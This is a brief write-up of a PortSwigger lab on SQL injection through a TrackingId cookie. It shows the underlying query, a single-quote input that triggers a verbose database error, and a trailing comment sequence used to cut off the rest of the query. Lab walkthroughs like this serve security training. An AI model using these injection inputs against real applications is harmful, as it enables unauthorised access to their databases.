## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/75b1abf1-d2a6-46c7-adeb-bbeedd147507)

## Solution :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/7191fb25-586f-4bd8-978b-a28860a600c6)

Query made - 

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'
```

Input `'` in the TrackingID parameter since it is vulnerable.

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>''
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/43dae4bd-6b44-4a01-be27-8f02c6e247ee)

In the response, notice the verbose error message.it means the injection is likely inside a single-quoted string.To solve this in the ping request, you can use comment characters to block the rest of the query.

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>''--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/25d233e0-5a2f-4bbc-b686-aa8b6a8eaf57)
